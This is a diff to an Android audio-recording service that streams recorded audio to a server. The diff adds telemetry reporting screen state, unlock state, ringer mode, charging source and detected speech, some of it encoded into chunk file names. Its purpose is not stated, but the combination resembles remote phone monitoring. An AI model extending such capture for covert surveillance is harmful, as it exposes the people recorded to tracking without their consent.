@@ -1,5 +1,6 @@
 package com.audiostream.client
 
+import android.app.KeyguardManager
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
@@ -15,6 +16,7 @@ import android.media.MediaCodec
 import android.media.MediaCodecInfo
 import android.media.MediaFormat
 import android.media.MediaRecorder
+import android.os.BatteryManager
 import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
@@ -194,6 +196,80 @@ class AudioRecordService : Service() {
     // ══════════════════════════════════════════════════════════════════════
 
     private var batteryReceiver: android.content.BroadcastReceiver? = null
+    private var screenReceiver: android.content.BroadcastReceiver? = null
+    private var currentPowerSource: String = "CBAT"
+    private var lastChunkIsSpeech: Boolean = false
+    private var lastChunkDb: Int = 0
+
+    private fun isScreenOn(): Boolean {
+        return try {
+            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
+                pm?.isInteractive ?: false
+            } else {
+                @Suppress("DEPRECATION")
+                pm?.isScreenOn ?: false
+            }
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    private fun isDeviceUnlocked(): Boolean {
+        return try {
+            val km = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
+            km?.isKeyguardLocked == false
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    private fun getRingerMode(): String {
+        return try {
+            val am = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
+            when (am?.ringerMode) {
+                AudioManager.RINGER_MODE_SILENT -> "RS"
+                AudioManager.RINGER_MODE_VIBRATE -> "RV"
+                else -> "RN"
+            }
+        } catch (e: Exception) {
+            "RN"
+        }
+    }
+
+    private fun registerScreenListener() {
+        val filter = android.content.IntentFilter().apply {
+            addAction(Intent.ACTION_SCREEN_ON)
+            addAction(Intent.ACTION_SCREEN_OFF)
+            addAction(Intent.ACTION_USER_PRESENT)
+        }
+        screenReceiver = object : android.content.BroadcastReceiver() {
+            override fun onReceive(context: Context?, intent: Intent?) {
+                when (intent?.action) {
+                    Intent.ACTION_SCREEN_ON -> sendLog("Display turned ON")
+                    Intent.ACTION_SCREEN_OFF -> sendLog("Display turned OFF")
+                    Intent.ACTION_USER_PRESENT -> sendLog("Device Unlocked")
+                }
+                sendLiveTelemetry()
+            }
+        }
+        registerReceiver(screenReceiver, filter)
+    }
+
+    private fun sendLiveTelemetry() {
+        val route = getCurrentAudioRoute()
+        socketManager?.sendTelemetry(
+            batteryPct = currentBatteryPct,
+            storageMb = currentStorageMB,
+            route = route,
+            screenOn = isScreenOn(),
+            isUnlocked = isDeviceUnlocked(),
+            powerSource = currentPowerSource,
+            ringerMode = getRingerMode(),
+            isSpeech = lastChunkIsSpeech,
+            audioDb = lastChunkDb
+        )
+    }
 
     private fun registerBatteryListener() {
         val filter = android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
@@ -213,8 +289,22 @@ class AudioRecordService : Service() {
         val scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
         val pct = if (level >= 0 && scale > 0) (level * 100 / scale.toFloat()).toInt() else -1
         currentBatteryPct = pct
+
+        val plugged = intent.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1)
+        currentPowerSource = when (plugged) {
+            android.os.BatteryManager.BATTERY_PLUGGED_USB -> "CUSB"
+            android.os.BatteryManager.BATTERY_PLUGGED_AC -> "CAC"
+            android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS -> "CWIR"
+            else -> "CBAT"
+        }
+
         val icon = if (isCharging) "⚡" else "🔋"
-        val stateStr = if (isCharging) "Charging" else "Discharging"
+        val stateStr = when (currentPowerSource) {
+            "CUSB" -> "USB/PC Connected"
+            "CAC" -> "AC Charging"
+            "CWIR" -> "Wireless Charging"
+            else -> if (isCharging) "Charging" else "Discharging"
+        }
         val batteryStatus = if (pct >= 0) "$icon $pct% ($stateStr)" else "$icon Unknown"
         val newDeviceInfo = "${Build.MANUFACTURER} ${Build.MODEL} | $batteryStatus"
 
@@ -222,6 +312,7 @@ class AudioRecordService : Service() {
             deviceInfo = newDeviceInfo
             uploadManager?.updateDeviceInfo(newDeviceInfo)
         }
+        sendLiveTelemetry()
     }
 
     private var isServiceInitialized = false
@@ -260,6 +351,7 @@ class AudioRecordService : Service() {
         )
 
         registerBatteryListener()
+        registerScreenListener()
 
         socketManager = DeviceSocketManager(
             serverUrl = serverUrl,
@@ -270,8 +362,7 @@ class AudioRecordService : Service() {
             onLog = { msg -> sendLog(msg) },
             onConnectionStateChanged = { connected ->
                 if (connected) {
-                    val route = getCurrentAudioRoute()
-                    socketManager?.sendTelemetry(currentBatteryPct, currentStorageMB, route)
+                    sendLiveTelemetry()
                     socketManager?.sendStatus(if (isRunning) "recording" else "idle")
                 }
             }
@@ -385,6 +476,11 @@ class AudioRecordService : Service() {
             batteryReceiver = null
         } catch (e: Exception) { /* ignore */ }
 
+        try {
+            screenReceiver?.let { unregisterReceiver(it) }
+            screenReceiver = null
+        } catch (e: Exception) { /* ignore */ }
+
         releaseWakeLock()
         serviceScope.coroutineContext.cancelChildren()
         stopForeground(STOP_FOREGROUND_REMOVE)
@@ -402,7 +498,7 @@ class AudioRecordService : Service() {
         telemetryJob = serviceScope.launch(Dispatchers.IO) {
             while (isActive) {
                 currentStorageMB = (storageManager?.getAvailableSpace() ?: 0L) / (1024 * 1024)
-                socketManager?.sendTelemetry(currentBatteryPct, currentStorageMB, getCurrentAudioRoute())
+                sendLiveTelemetry()
                 delay(60000L) // Poll every 60 seconds
             }
         }
@@ -800,7 +896,20 @@ class AudioRecordService : Service() {
             
             // Phase 4: Telemetry in Segment Names
             val currentRoute = getCurrentAudioRoute()
-            val telemetrySuffix = "_B${currentBatteryPct}_S${currentStorageMB}_O${currentRoute}"
+            val rmsDb = calculateRMS(pcmData, dataSize)
+            val positiveDb = (rmsDb + 100.0).toInt().coerceIn(0, 99)
+            val isSpeech = rmsDb >= -50.0
+            lastChunkIsSpeech = isSpeech
+            lastChunkDb = positiveDb
+
+            val dTag = if (isScreenOn()) "D1" else "D0"
+            val uTag = if (isDeviceUnlocked()) "U1" else "U0"
+            val cTag = currentPowerSource
+            val rTag = getRingerMode()
+            val vTag = if (isSpeech) "V1" else "V0"
+            val dbTag = "dB$positiveDb"
+
+            val telemetrySuffix = "_B${currentBatteryPct}_S${currentStorageMB}_O${currentRoute}_${dTag}_${uTag}_${cTag}_${rTag}_${vTag}_${dbTag}"
             val aacFile = File(chunksDir, "chunk_${System.currentTimeMillis()}_${targetStreamType}${telemetrySuffix}.aac")
             
             // Update timestamp to include telemetry for the server HLS generation
